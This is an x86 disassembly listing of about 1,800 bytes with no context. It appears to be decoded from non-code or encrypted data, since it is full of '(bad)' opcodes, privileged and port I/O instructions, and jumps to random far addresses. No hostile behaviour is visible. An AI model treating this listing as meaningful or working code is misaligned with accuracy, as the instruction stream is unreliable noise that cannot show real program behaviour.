  41a349:	dec    edx
  41a34a:	repnz push ecx
  41a34c:	pushf  
  41a34d:	mov    ecx,0x1dc3ce63
  41a352:	adc    DWORD PTR [esi],esi
  41a354:	mov    BYTE PTR [eax],bl
  41a356:	sti    
  41a357:	and    edx,ebp
  41a359:	rcl    DWORD PTR [esi],cl
  41a35b:	dec    esi
  41a35c:	arpl   WORD PTR cs:[eax-0x2],cx
  41a360:	jnp    0x41a361
  41a362:	hlt    
  41a363:	mov    bh,0x9a
  41a365:	xor    DWORD PTR [edx-0x116d658b],esi
  41a36b:	xor    DWORD PTR [esi-0x1a91761],ebp
  41a371:	or     ch,BYTE PTR [edi-0x4092dc58]
  41a377:	xchg   esp,eax
  41a378:	clc    
  41a379:	push   0x35b1b27
  41a37e:	das    
  41a37f:	ds in  eax,dx
  41a381:	cs out 0xa,al
  41a384:	cmp    eax,0xbe5f502a
  41a389:	inc    esi
  41a38a:	sub    eax,DWORD PTR [edi]
  41a38c:	push   ebp
  41a38d:	xor    BYTE PTR [ecx],0x32
  41a390:	push   edx
  41a391:	cmp    eax,DWORD PTR [ecx]
  41a393:	test   BYTE PTR [ebp+0x5948a12d],al
  41a399:	movsx  esp,si
  41a39c:	out    dx,al
  41a39d:	jae    0x41a350
  41a39f:	pop    ecx
  41a3a0:	inc    eax
  41a3a1:	popf   
  41a3a2:	iret   
  41a3a3:	iret   
  41a3a4:	(bad)  
  41a3a5:	or     BYTE PTR [ecx+eiz*4+0xf77ed90],al
  41a3ac:	dec    eax
  41a3ad:	les    edx,FWORD PTR [eax-0x19]
  41a3b0:	jns    0x41a383
  41a3b2:	imul   esi,DWORD PTR [edx+eiz*4],0x10
  41a3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3b7:	sub    DWORD PTR [edx+0x37],0x9d5f7bb0
  41a3be:	enter  0xa59e,0xff
  41a3c2:	ror    BYTE PTR [edi-0x21],cl
  41a3c5:	sub    al,0x21
  41a3c7:	inc    ebx
  41a3c8:	pop    ebx
  41a3c9:	jns    0x41a3f5
  41a3cb:	jbe    0x41a398
  41a3cd:	jg     0x41a399
  41a3cf:	xor    bh,BYTE PTR [edi+0x6e]
  41a3d2:	inc    ebx
  41a3d3:	adc    al,BYTE PTR [ecx-0x63]
  41a3d6:	jmp    FWORD PTR [edi+0x6a]
  41a3d9:	iret   
  41a3da:	add    BYTE PTR [esi+0xf],bh
  41a3dd:	dec    ebx
  41a3de:	jo     0x41a412
  41a3e0:	jno    0x41a39a
  41a3e2:	test   DWORD PTR [ecx],esi
  41a3e4:	mov    esp,0x7eb6f72a
  41a3e9:	retf   
  41a3ea:	call   0x7be94ec5
  41a3ef:	rcr    BYTE PTR [ebp-0x4e197cb5],cl
  41a3f5:	call   FWORD PTR [ebx+0x231074bd]
  41a3fb:	stos   DWORD PTR es:[edi],eax
  41a3fc:	loop   0x41a3a5
  41a3fe:	inc    esi
  41a3ff:	test   BYTE PTR [ebx-0x43],0xd3
  41a403:	test   BYTE PTR [ebx-0x65],dh
  41a406:	adc    ch,BYTE PTR fs:0x62730a1f
  41a40d:	fcom   st(5)
  41a40f:	or     eax,0x203fadf4
  41a414:	mov    dl,0xdd
  41a416:	mov    al,ds:0x1b05d1dd
  41a41b:	xchg   edi,eax
  41a41c:	fucom  st(5)
  41a41e:	xchg   ebp,eax
  41a41f:	repz mov esi,0xf8073097
  41a425:	into   
  41a426:	fmul   st,st(3)
  41a428:	bound  esp,QWORD PTR [eax]
  41a42a:	idiv   BYTE PTR [eax+0x47]
  41a42d:	arpl   WORD PTR [esp+ecx*4+0x32],sp
  41a431:	jl     0x41a401
  41a433:	jp     0x41a3e5
  41a435:	daa    
  41a436:	mov    eax,0xd61a14ce
  41a43b:	cmp    esp,DWORD PTR [esi+ebx*1]
  41a43e:	and    eax,0x1f6b6291
  41a443:	repz imul ebx,ecx,0xffffffde
  41a447:	mov    ch,0xd1
  41a449:	mov    edx,0xb61ead07
  41a44e:	push   esp
  41a44f:	xor    DWORD PTR [ebx],edx
  41a451:	xchg   edx,eax
  41a452:	adc    DWORD PTR [ecx-0x32],ebp
  41a455:	jne    0x41a3f8
  41a457:	sub    BYTE PTR [edi],ah
  41a459:	mov    al,ds:0xc300589b
  41a45e:	lahf   
  41a45f:	xchg   esp,eax
  41a460:	(bad)  
  41a461:	lock stos BYTE PTR es:[edi],al
  41a463:	mov    DWORD PTR [esi+ebp*4-0x75],0x523d4b43
  41a46b:	data16 rcr BYTE PTR [ecx+0xd5544d6],1
  41a472:	not    edi
  41a474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a475:	or     edi,ecx
  41a477:	lds    ebp,FWORD PTR [esi-0x1d]
  41a47a:	in     al,0x15
  41a47c:	dec    esi
  41a47d:	ja     0x41a4a2
  41a47f:	jmp    0x41a460
  41a481:	test   al,0xa8
  41a483:	push   0xffffff95
  41a485:	shr    DWORD PTR [ebx+eax*2-0x35],1
  41a489:	aad    0xca
  41a48b:	xchg   ebp,eax
  41a48c:	mov    ds:0x17f684f2,eax
  41a491:	mov    al,0x5b
  41a493:	repz invd 
  41a496:	int    0x5
  41a498:	mov    ecx,DWORD PTR [ebx-0x64]
  41a49b:	mov    edi,0x77e6dd11
  41a4a0:	mov    cl,0xf2
  41a4a2:	inc    ebp
  41a4a3:	int    0x7e
  41a4a5:	das    
  41a4a6:	jo     0x41a439
  41a4a8:	aam    0x4
  41a4aa:	dec    edi
  41a4ab:	das    
  41a4ac:	repnz test eax,0x684c51d3
  41a4b2:	sub    al,0x15
  41a4b4:	scas   al,BYTE PTR es:[edi]
  41a4b5:	fmul   QWORD PTR [ebx+0x3ceba78f]
  41a4bb:	out    0xe9,eax
  41a4bd:	stc    
  41a4be:	adc    BYTE PTR [edi],dl
  41a4c0:	mov    dh,0x7
  41a4c2:	int    0x5e
  41a4c4:	jge    0x41a465
  41a4c6:	dec    esp
  41a4c7:	push   esi
  41a4c8:	fisub  WORD PTR [esi-0x29]
  41a4cb:	cmp    eax,0xd7e59357
  41a4d0:	inc    edx
  41a4d1:	outs   dx,BYTE PTR ds:[esi]
  41a4d2:	push   cs
  41a4d3:	mov    ch,0xb8
  41a4d5:	xchg   BYTE PTR [ebx],dl
  41a4d7:	mov    edi,0x27ab8eab
  41a4dc:	adc    al,0x39
  41a4de:	pop    ds
  41a4df:	aam    0x20
  41a4e1:	dec    ebp
  41a4e2:	inc    ebp
  41a4e3:	retf   
  41a4e4:	lea    eax,[bp+si-0x7a]
  41a4e8:	call   0xa06892a3
  41a4ed:	inc    eax
  41a4ee:	add    DWORD PTR [edi],eax
  41a4f0:	cwde   
  41a4f1:	in     eax,0x10
  41a4f3:	(bad)  
  41a4f4:	cli    
  41a4f5:	mov    dl,0x69
  41a4f7:	or     al,0xac
  41a4f9:	cmp    eax,0x925b0f45
  41a4fe:	adc    BYTE PTR [ecx-0x5d752942],ah
  41a504:	push   0xffffffa6
  41a506:	or     BYTE PTR [edx],bl
  41a508:	xchg   ebx,eax
  41a509:	test   BYTE PTR gs:[edx+0x70],ch
  41a50d:	push   0x76
  41a50f:	xchg   ecx,eax
  41a510:	xchg   edi,eax
  41a511:	lods   al,BYTE PTR ds:[esi]
  41a513:	pop    edi
  41a514:	out    0x1,eax
  41a516:	jno    0x41a55c
  41a518:	(bad)  
  41a519:	fisub  DWORD PTR [edi+eiz*4+0x64]
  41a51d:	jge    0x41a4f5
  41a51f:	js     0x41a4e2
  41a521:	imul   eax,DWORD PTR [esp+esi*1+0x32877e14],0x67
  41a529:	out    dx,eax
  41a52a:	mul    bl
  41a52c:	mov    edx,0x5b65ff99
  41a531:	scas   al,BYTE PTR es:[edi]
  41a532:	inc    edi
  41a533:	into   
  41a534:	shr    cl,1
  41a536:	or     DWORD PTR [edx-0x6fee0a6d],esp
  41a53c:	lds    edx,FWORD PTR [ebp+0x70]
  41a53f:	jmp    0xeea57686
  41a544:	fcomp  DWORD PTR [esi-0x18bb2143]
  41a54a:	cs mov ebx,0x598cda8b
  41a550:	add    ah,BYTE PTR [edi]
  41a552:	inc    edx
  41a553:	mov    ds:0x5b7fbfd,eax
  41a558:	out    dx,eax
  41a559:	rcr    BYTE PTR [edx+0x28],1
  41a55c:	mov    eax,ds:0x199008e6
  41a561:	xor    edx,eax
  41a563:	mul    BYTE PTR [edi+0x5d1207d]
  41a569:	and    eax,0xe1b0b31d
  41a56e:	sbb    al,0x93
  41a570:	mov    esi,0x6f858359
  41a575:	inc    ebp
  41a576:	add    eax,0x742df2dc
  41a57b:	call   0xebab0180
  41a580:	dec    eax
  41a581:	mov    ebp,0x75315dee
  41a586:	jl     0x41a591
  41a588:	lds    esi,FWORD PTR [edx-0x6505a377]
  41a58e:	push   ebx
  41a58f:	xor    bl,0x97
  41a592:	push   esi
  41a593:	inc    ecx
  41a594:	call   0x16a6:0xf1808b65
  41a59b:	inc    esi
  41a59c:	pushf  
  41a59d:	pop    ss
  41a59e:	sbb    edi,DWORD PTR [ebx]
  41a5a0:	sub    dl,BYTE PTR [ecx-0x1af8c0bb]
  41a5a6:	mov    esp,0xc47970c5
  41a5ab:	push   0xf2e95beb
  41a5b0:	or     ah,BYTE PTR [esi-0x33]
  41a5b3:	stos   BYTE PTR es:[edi],al
  41a5b4:	scas   al,BYTE PTR es:[edi]
  41a5b5:	js     0x41a585
  41a5b7:	imul   esp,DWORD PTR [ebx+ebx*2],0xffffffb3
  41a5bb:	pop    eax
  41a5bc:	sbb    BYTE PTR [eax+0x5a7b6b14],0xbb
  41a5c3:	iret   
  41a5c4:	inc    esi
  41a5c5:	imul   edx,edi,0xffffff90
  41a5c8:	(bad)  
  41a5c9:	aas    
  41a5ca:	scas   eax,DWORD PTR es:[edi]
  41a5cb:	ins    BYTE PTR es:[edi],dx
  41a5cc:	cmc    
  41a5cd:	jle    0x41a5fb
  41a5cf:	cmp    eax,0xa6bb1eac
  41a5d4:	mov    WORD PTR [edx+eiz*8-0x64],?
  41a5d8:	sub    BYTE PTR [ecx-0x7b],ch
  41a5db:	pop    ebx
  41a5dc:	adc    al,0xa
  41a5de:	js     0x41a5b1
  41a5e0:	mov    ah,ch
  41a5e2:	loope  0x41a58b
  41a5e4:	mov    edx,0xb12e2c39
  41a5e9:	daa    
  41a5ea:	mov    eax,0x3048c77c
  41a5ef:	lds    edx,FWORD PTR [ecx]
  41a5f1:	cmp    dl,ah
  41a5f3:	inc    esi
  41a5f4:	pusha  
  41a5f5:	inc    esi
  41a5f6:	push   0xffffff96
  41a5f8:	mov    bh,0x96
  41a5fa:	xchg   eax,esi
  41a5fc:	adc    DWORD PTR cs:[ecx-0x57552e29],0x76
  41a604:	fwait
  41a605:	lock call 0xd41:0xf1dfea41
  41a60d:	push   ebp
  41a60e:	mov    bh,0xb3
  41a610:	loopne 0x41a5a9
  41a612:	dec    edi
  41a613:	lods   eax,DWORD PTR ds:[esi]
  41a614:	mov    eax,0xf5de46d9
  41a619:	cdq    
  41a61a:	enter  0x27ab,0x52
  41a61e:	or     eax,0x3c76f829
  41a623:	(bad)  
  41a624:	cwde   
  41a625:	enter  0x5771,0xbc
  41a629:	retf   
  41a62a:	ins    BYTE PTR es:[edi],dx
  41a62b:	add    al,0xcd
  41a62d:	or     BYTE PTR [ecx-0x5f2a4764],dh
  41a633:	out    0x18,eax
  41a635:	fdivrp st(4),st
  41a637:	mov    DWORD PTR [esi-0x36cb9177],0x2ae08c4
  41a641:	mov    dh,0x99
  41a643:	xor    DWORD PTR [esi+ecx*2-0x3aaabb65],0x76d83f68
  41a64e:	retf   0x728d
  41a651:	lods   al,BYTE PTR ds:[esi]
  41a652:	jmp    0xdfdb17ef
  41a657:	arpl   si,di
  41a659:	jle    0x41a698
  41a65b:	or     eax,0xde383c25
  41a660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a661:	shl    BYTE PTR [esp+eax*2+0x6b],0xe3
  41a666:	clc    
  41a667:	add    dl,bh
  41a669:	sbb    al,BYTE PTR [ecx+0x2e958b3d]
  41a66f:	js     0x41a632
  41a671:	push   eax
  41a672:	inc    ebp
  41a673:	enter  0x3548,0x37
  41a677:	jg     0x41a651
  41a679:	and    ebp,DWORD PTR [ebx]
  41a67b:	jmp    0x778a:0x1d070f80
  41a682:	jne    0x41a668
  41a684:	daa    
  41a685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a686:	jb     0x41a6c4
  41a688:	xchg   edi,eax
  41a689:	mov    al,0xa7
  41a68b:	mov    esi,0x3ffd7605
  41a690:	not    dh
  41a692:	dec    eax
  41a693:	and    esi,DWORD PTR [eax+0x63f3ce79]
  41a699:	inc    edx
  41a69a:	dec    eax
  41a69b:	popa   
  41a69c:	pop    ss
  41a69d:	mov    cl,0x1b
  41a69f:	xor    DWORD PTR ds:0xeaa115d6,0x1e95abcf
  41a6a9:	ret    
  41a6aa:	fild   DWORD PTR [eax]
  41a6ac:	cdq    
  41a6ad:	mov    ebx,0x692d2a3c
  41a6b2:	add    dl,BYTE PTR [esi-0x313aaee3]
  41a6b8:	jns    0x41a6a9
  41a6ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6bb:	ja     0x41a653
  41a6bd:	pusha  
  41a6be:	out    0x99,eax
  41a6c0:	fucomip st,st(1)
  41a6c2:	(bad)  
  41a6c4:	mov    dl,0x17
  41a6c6:	sub    edi,edi
  41a6c8:	stos   DWORD PTR es:[edi],eax
  41a6c9:	cmc    
  41a6ca:	es ret 
  41a6cc:	dec    esi
  41a6cd:	sub    al,0x62
  41a6cf:	jmp    0x63f:0x972cec8f
  41a6d6:	mov    al,ds:0x6d609dd8
  41a6db:	jns    0x41a6e0
  41a6dd:	and    eax,0x29b1aa38
  41a6e2:	outs   dx,DWORD PTR ds:[esi]
  41a6e3:	mov    eax,ds:0xf7ef2312
  41a6e8:	xlat   BYTE PTR ds:[ebx]
  41a6e9:	and    ch,BYTE PTR [edi-0x61]
  41a6ec:	and    al,0x5a
  41a6ee:	sbb    eax,0x28bd222
  41a6f3:	stos   DWORD PTR es:[edi],eax
  41a6f4:	popa   
  41a6f5:	sbb    BYTE PTR [esi],0xec
  41a6f8:	pop    esi
  41a6f9:	xchg   ebp,eax
  41a6fa:	jle    0x41a740
  41a6fc:	jl     0x41a6d6
  41a6fe:	cmp    BYTE PTR [esi],al
  41a700:	sbb    DWORD PTR [edi-0x1f],ecx
  41a703:	push   ebx
  41a704:	jbe    0x41a6a1
  41a706:	dec    ecx
  41a707:	jbe    0x41a745
  41a709:	sub    eax,0xd58b0273
  41a70e:	sbb    BYTE PTR [eax-0x533fc391],al
  41a714:	push   ebx
  41a715:	cli    
  41a716:	into   
  41a717:	adc    BYTE PTR [esi+0x57],al
  41a71a:	lods   al,BYTE PTR ds:[esi]
  41a71b:	or     al,0x7c
  41a71d:	mov    ?,WORD PTR [ecx+ebp*8-0x31]
  41a721:	in     eax,dx
  41a722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a723:	mov    esi,0x74d275b6
  41a728:	sbb    al,al
  41a72a:	inc    DWORD PTR [esi+0x5d]
  41a72d:	xor    DWORD PTR [edx+0x5f],edi
  41a730:	fldenv [eax-0x43]
  41a733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a734:	daa    
  41a735:	jns    0x41a794
  41a737:	(bad)  
  41a738:	mov    cl,0xd7
  41a73a:	jno    0x41a7a6
  41a73c:	mov    esp,0x9ee0d2fc
  41a741:	and    eax,0x24d3f8c4
  41a746:	cs push edi
  41a748:	sub    dh,BYTE PTR [esi+0x40c1a2c0]
  41a74e:	scas   eax,DWORD PTR es:[edi]
  41a74f:	es out 0x16,al
  41a752:	xchg   ebp,eax
  41a753:	and    BYTE PTR [edx],0x86
  41a756:	hlt    
  41a757:	enter  0xb1e4,0x7
  41a75b:	inc    esp
  41a75c:	inc    edx
  41a75d:	mov    dl,0x59
  41a75f:	enter  0x31f4,0x1a
  41a763:	cs iret 
  41a765:	gs cdq 
  41a767:	es xchg esp,esp
  41a76a:	fstp   TBYTE PTR [edx-0x40b0ec74]
  41a770:	jmp    0xe794:0x883d2671
  41a777:	jl     0x41a7a2
  41a779:	push   0xffffffbc
  41a77b:	and    bl,BYTE PTR [esi-0x30]
  41a77e:	mov    eax,ds:0x50864ee1
  41a783:	xor    al,0xa1
  41a785:	sub    ah,BYTE PTR [edi+0x68e4f96e]
  41a78b:	jne    0x41a718
  41a78d:	adc    al,ch
  41a78f:	sub    eax,0xc100937a
  41a794:	inc    edi
  41a795:	xchg   edx,eax
  41a796:	mov    ds:0x61c1888c,eax
  41a79b:	cmp    ah,BYTE PTR [eax+0x77c8e7ad]
  41a7a1:	or     BYTE PTR ds:0x21ad7415,0xef
  41a7a8:	inc    edx
  41a7a9:	loop   0x41a73a
  41a7ab:	arpl   WORD PTR [edi],di
  41a7ad:	stos   DWORD PTR es:[edi],eax
  41a7ae:	in     eax,0xc6
  41a7b0:	aad    0xe7
  41a7b2:	xchg   esi,eax
  41a7b3:	dec    dx
  41a7b5:	test   BYTE PTR [edx+0x22c330d2],ah
  41a7bb:	aaa    
  41a7bc:	mov    bl,0xd0
  41a7be:	xor    esi,0xffffffa4
  41a7c1:	adc    dh,BYTE PTR [ebx]
  41a7c3:	sub    ecx,ebx
  41a7c5:	mov    ah,ah
  41a7c7:	jecxz  0x41a754
  41a7c9:	add    cl,0xfc
  41a7cc:	xor    edx,edx
  41a7ce:	cli    
  41a7cf:	and    eax,0x8740fff5
  41a7d4:	cmp    al,ch
  41a7d6:	dec    edi
  41a7d7:	add    DWORD PTR [eax-0x3b],ebp
  41a7da:	sub    BYTE PTR [ebx],bl
  41a7dc:	adc    eax,DWORD PTR [eax-0x1ca43c7c]
  41a7e2:	adc    DWORD PTR ds:[ebx-0xf],ebp
  41a7e6:	push   ds
  41a7e7:	add    al,0x94
  41a7e9:	int3   
  41a7ea:	aas    
  41a7eb:	sbb    al,0x71
  41a7ed:	fisttp DWORD PTR [eax]
  41a7ef:	pop    ds
  41a7f0:	mov    ecx,0x47db4320
  41a7f5:	push   es
  41a7f6:	mov    bh,0xfa
  41a7f8:	push   ss
  41a7f9:	adc    al,0x57
  41a7fb:	out    dx,eax
  41a7fc:	sahf   
  41a7fd:	test   al,0xa9
  41a7ff:	push   cs
  41a800:	sbb    ecx,eax
  41a802:	cwde   
  41a803:	fbld   TBYTE PTR [ecx-0x22b9fad]
  41a809:	xor    eax,DWORD PTR [eax+0x71]
  41a80c:	loope  0x41a7a0
  41a80e:	xchg   cl,bh
  41a810:	dec    edi
  41a811:	arpl   WORD PTR [eax-0x17],di
  41a814:	mul    DWORD PTR [esi]
  41a816:	inc    ecx
  41a817:	xchg   ecx,eax
  41a818:	xchg   ebx,eax
  41a819:	pop    edi
  41a81a:	inc    eax
  41a81b:	push   ss
  41a81c:	and    al,0x5c
  41a81e:	sub    DWORD PTR [eax+ebp*1-0x58],esi
  41a822:	test   DWORD PTR [edi+ebx*2],ebp
  41a825:	arpl   sp,ax
  41a827:	inc    ebx
  41a828:	aas    
  41a829:	xchg   DWORD PTR [ecx+0x4a],esi
  41a82c:	mov    ebp,0xff72f00
  41a831:	leave  
  41a832:	popf   
  41a833:	mov    bl,0x4f
  41a835:	mov    ebp,0x33302426
  41a83a:	int3   
  41a83b:	cmp    eax,0x6bdfd59a
  41a840:	xor    al,0xdd
  41a842:	hlt    
  41a843:	push   ds
  41a844:	sub    ebp,edi
  41a846:	fsub   QWORD PTR [ecx-0x3]
  41a849:	es test al,0x29
  41a84c:	imul   ecx,DWORD PTR [eax-0x144fbbf7],0xeb0a065c
  41a856:	(bad)  
  41a857:	lods   eax,DWORD PTR ds:[esi]
  41a858:	add    BYTE PTR ss:[edx],ah
  41a85b:	mov    dl,0x18
  41a85d:	cmp    DWORD PTR [ecx+0x115be93],edi
  41a863:	sar    DWORD PTR [ebx-0x21],1
  41a866:	xchg   esi,eax
  41a867:	push   esp
  41a868:	or     al,0x44
  41a86a:	clc    
  41a86b:	jo     0x41a886
  41a86d:	out    0x41,al
  41a86f:	mov    esp,0xc85d6f36
  41a874:	fwait
  41a875:	xchg   ebx,eax
  41a876:	or     al,0xb4
  41a878:	pop    DWORD PTR [esi-0x11]
  41a87b:	push   esi
  41a87c:	and    dh,BYTE PTR [edx]
  41a87e:	mov    esi,0xd7ad6cde
  41a883:	cmp    DWORD PTR [eax+ebp*8],0xdddd29a
  41a88a:	rol    bh,cl
  41a88c:	mov    bl,BYTE PTR [eax]
  41a88e:	stos   DWORD PTR es:[edi],eax
  41a88f:	repz and DWORD PTR [eax+0x4c],ecx
  41a893:	es jle 0x41a913
  41a896:	and    al,0x8b
  41a898:	or     eax,DWORD PTR [esi+0x45]
  41a89b:	sbb    ch,0xfa
  41a89e:	and    al,0xb9
  41a8a0:	loop   0x41a841
  41a8a2:	pusha  
  41a8a3:	js     0x41a8e3
  41a8a5:	loopne 0x41a863
  41a8a7:	inc    bx
  41a8a9:	jno    0x41a8d4
  41a8ab:	fistp  QWORD PTR [ebx-0x58]
  41a8ae:	outs   dx,BYTE PTR ds:[esi]
  41a8af:	add    al,0x91
  41a8b1:	je     0x41a852
  41a8b3:	iret   
  41a8b4:	inc    ebp
  41a8b5:	and    ah,BYTE PTR [edi-0x3384832b]
  41a8bb:	pop    edi
  41a8bc:	lock and dh,dh
  41a8bf:	lods   al,BYTE PTR ds:[esi]
  41a8c0:	lods   al,BYTE PTR ds:[esi]
  41a8c1:	xchg   ebx,eax
  41a8c2:	push   ebp
  41a8c3:	add    eax,0x5e298040
  41a8c8:	mov    es,WORD PTR [ecx-0x24]
  41a8cb:	fabs   
  41a8cd:	das    
  41a8ce:	pop    ebp
  41a8cf:	div    BYTE PTR [edx-0x6bf93445]
  41a8d5:	fisub  WORD PTR [edi+0x5373f398]
  41a8db:	mov    ebx,0x267e92fd
  41a8e0:	mov    ds:0x9f08978,eax
  41a8e5:	rcr    BYTE PTR [edi-0x644b6f75],1
  41a8eb:	xchg   edi,eax
  41a8ec:	mov    dh,cl
  41a8ee:	mov    cl,0x59
  41a8f0:	pop    ss
  41a8f1:	mov    ecx,0xae2c8b99
  41a8f6:	test   BYTE PTR [ebx-0x6286622c],cl
  41a8fc:	mov    al,0xf2
  41a8fe:	fs out dx,al
  41a900:	out    dx,eax
  41a901:	xchg   edx,eax
  41a902:	das    
  41a903:	jge    0x41a8a2
  41a905:	icebp  
  41a906:	or     BYTE PTR [ebx+0x52],dl
  41a909:	sbb    eax,0xcffb38a5
  41a90e:	rcl    ebp,cl
  41a910:	out    dx,eax
  41a911:	or     cl,BYTE PTR [ecx+0x13]
  41a914:	and    BYTE PTR [ecx+0x25],ah
  41a917:	and    dh,BYTE PTR [edx+ebx*4-0x5c6e7618]
  41a91e:	and    esi,DWORD PTR [edi-0x55]
  41a921:	loopne 0x41a95c
  41a923:	dec    edi
  41a924:	xchg   BYTE PTR [ebx-0x27e88072],al
  41a92a:	or     eax,eax
  41a92c:	add    dl,al
  41a92e:	jo     0x41a916
  41a930:	popa   
  41a931:	outs   dx,BYTE PTR ds:[esi]
  41a932:	cmp    al,0x1f
  41a934:	loopne 0x41a8b9
  41a936:	mov    ah,0x21
  41a938:	pop    esi
  41a939:	pop    edx
  41a93a:	jmp    0xf9b8:0xd02c6431
  41a941:	sub    ebx,DWORD PTR [ebx+edx*2+0x48]
  41a945:	jge    0x41a8cd
  41a947:	xchg   edx,esp
  41a949:	push   ds
  41a94a:	mov    esi,0xc61ba15b
  41a94f:	mov    esi,0x5f69c5aa
  41a954:	sub    DWORD PTR [ebp+0x12],ebx
  41a957:	cld    
  41a958:	icebp  
  41a959:	loope  0x41a8fc
  41a95b:	sar    DWORD PTR [eax+0x2b34a495],cl
  41a961:	mov    bl,0xd9
  41a963:	mov    cl,0xbe
  41a965:	das    
  41a966:	jbe    0x41a97b
  41a968:	xor    ch,dl
  41a96a:	dec    esp
  41a96b:	add    eax,0x744da398
  41a970:	mov    ebx,0xd79ae65b
  41a975:	repnz dec ebx
  41a977:	mov    edx,DWORD PTR [edi]
  41a979:	imul   esp,DWORD PTR [edi-0x1673cc6e],0x94943a4f
  41a983:	test   esi,edx
  41a985:	or     al,0xa8
  41a987:	pop    esi
  41a988:	loopne 0x41a9b3
  41a98a:	and    bh,al
  41a98c:	mov    al,ds:0x53bd1295
  41a991:	sub    eax,0xf4dcdd2e
  41a996:	mov    edi,0xe6d134b3
  41a99b:	enter  0x2ddf,0xd0
  41a99f:	inc    edx
  41a9a0:	xchg   DWORD PTR [edi+0x6a],esp
  41a9a3:	in     eax,0x95
  41a9a5:	test   DWORD PTR [ebx+0x67],edx
  41a9a8:	add    eax,0x848ea65e
  41a9ad:	pop    ss
  41a9ae:	xor    al,0x3f
  41a9b0:	mov    ebp,0x2a4e8e06
  41a9b5:	sti    
  41a9b6:	mov    ah,0x18
  41a9b8:	pop    ecx
  41a9b9:	adc    al,0xe3
  41a9bb:	push   ecx
  41a9bc:	loope  0x41a956
  41a9be:	ins    DWORD PTR es:[edi],dx
  41a9bf:	jp     0x41a99e
  41a9c1:	hlt    
  41a9c2:	ss add eax,0x515cd630
  41a9c8:	cmp    ah,bh
  41a9ca:	mul    ebp
  41a9cc:	push   edi
  41a9cd:	sub    cl,bh
  41a9cf:	das    
  41a9d0:	xchg   edx,eax
  41a9d1:	xchg   edx,eax
  41a9d2:	sub    al,0xc8
  41a9d4:	push   cs
  41a9d5:	(bad)  
  41a9d6:	xchg   ebp,eax
  41a9d7:	into   
  41a9d8:	dec    ecx
  41a9d9:	mov    esi,0xc004425a
  41a9de:	xchg   ecx,eax
  41a9df:	mov    dl,BYTE PTR [eax+ecx*1+0x21]
  41a9e3:	sbb    cl,dh
  41a9e5:	cli    
  41a9e6:	adc    eax,0x1ad8f63
  41a9eb:	push   ebx
  41a9ec:	out    dx,eax
  41a9ed:	cmp    BYTE PTR ds:0xa080c58f,cl
  41a9f3:	fadd   st,st(4)
  41a9f5:	pop    esi
  41a9f6:	call   0x70b5c07c
  41a9fb:	pop    eax
  41a9fc:	fsubp  st(4),st
  41a9fe:	mov    ebp,0x46541138
  41aa03:	fisubr WORD PTR [ecx-0x4b9393a0]
  41aa09:	mov    dl,0x9e
  41aa0b:	add    edi,0xfffffffb
  41aa0e:	mov    ebp,0xef01e1a2
  41aa13:	and    al,0x4e
  41aa15:	mov    cl,0xc8
  41aa17:	sub    ebx,ebx
  41aa19:	jmp    0x98b3eb76
  41aa1e:	and    BYTE PTR [eax-0x3183de2c],0xfb
  41aa25:	std    
  41aa26:	sti    
  41aa27:	inc    edi
  41aa28:	adc    eax,0xbf005134
  41aa2d:	out    0x40,eax
  41aa2f:	xchg   ecx,eax
  41aa30:	and    al,BYTE PTR [ebx+0x32789c59]
  41aa36:	push   esp
  41aa37:	xchg   ebx,eax
  41aa38:	clc    
  41aa39:	(bad)  
  41aa3a:	retf   
  41aa3b:	cwde   
  41aa3c:	mov    ebx,DWORD PTR [eax]
  41aa3e:	dec    eax
  41aa3f:	dec    ecx
  41aa40:	aas    
  41aa41:	mov    dh,0x7e
  41aa43:	mov    ebx,0xab7cc214
  41aa48:	mov    dh,0x9e
  41aa4a:	or     BYTE PTR [edx],dl
  41aa4c:	les    ebp,FWORD PTR [eax+0x65]
  41aa4f:	add    al,0xd9
  41aa51:	jo     0x41aa27
  41aa53:	xor    eax,0xc9d1bfcb
  41aa58:	invd   
  41aa5a:	and    eax,0xe6e4bf41
  41aa5f:	(bad)  
  41aa60:	sti    
  41aa61:	lahf   
  41aa62:	push   esi
  41aa63:	cdq    
  41aa64:	test   eax,0x176bcf17
  41aa69:	sahf   
  41aa6a:	adc    DWORD PTR [ecx-0x3464ba48],0xb30438e1
  41aa74:	sub    al,0x53
  41aa76:	pusha  
  41aa77:	and    al,BYTE PTR [edi+0x4c44f98f]
  41aa7d:	pusha  
  41aa7e:	sub    eax,DWORD PTR [esi+0x62]
  41aa81:	push   ecx
  41aa82:	adc    BYTE PTR [ecx-0x5ee9295],bh
  41aa88:	push   0xcc9350c5
  41aa8d:	pusha  
  41aa8e:	ret    
  41aa8f:	sub    eax,0x782dfee3
  41aa94:	xor    ecx,eax
  41aa96:	mov    ah,0x25
  41aa98:	(bad)  
  41aa99:	push   edi
  41aa9a:	repz aad 0x23
  41aa9d:	jmp    0x41aa8d
  41aa9f:	mov    al,0x18
  41aaa1:	mov    ds:0x1b73081b,eax
  41aaa6:	imul   ebx,DWORD PTR [eax],0xffffff88
  41aaa9:	adc    al,BYTE PTR [eax+0x6855e6bb]
  41aaaf:	jg     0x41aa78
  41aab1:	xor    BYTE PTR [edi],dl
  41aab3:	xor    ah,bl
  41aab5:	or     al,0x17
  41aab7:	xor    dl,BYTE PTR [esi]
  41aab9:	mov    esp,0x60de621e
  41aabe:	test   BYTE PTR [edi],al
  41aac0:	(bad)  
  41aac1:	ja     0x41ab00
  41aac3:	stos   DWORD PTR es:[edi],eax
  41aac4:	arpl   sp,dx
  41aac6:	test   BYTE PTR [ebx],cl
  41aac8:	sbb    ch,dl
  41aaca:	ret    0x7efd
  41aacd:	loope  0x41aaa2
  41aacf:	mov    esi,0x2ae01d1c
  41aad4:	adc    DWORD PTR [eax+ebx*4-0x65],eax
  41aad8:	pop    esp
  41aad9:	cmp    eax,DWORD PTR [esi+0x76]
  41aadc:	idiv   DWORD PTR [esi+0x7c]
  41aadf:	jns    0x41aac6
  41aae1:	adc    BYTE PTR [edi],bl
  41aae3:	imul   edi,DWORD PTR [eax+0x72dcee6a],0x1c
  41aaea:	mov    edx,0x9c6b5787
  41aaef:	or     cl,dh
  41aaf1:	pop    esp
  41aaf2:	mov    dh,0xab
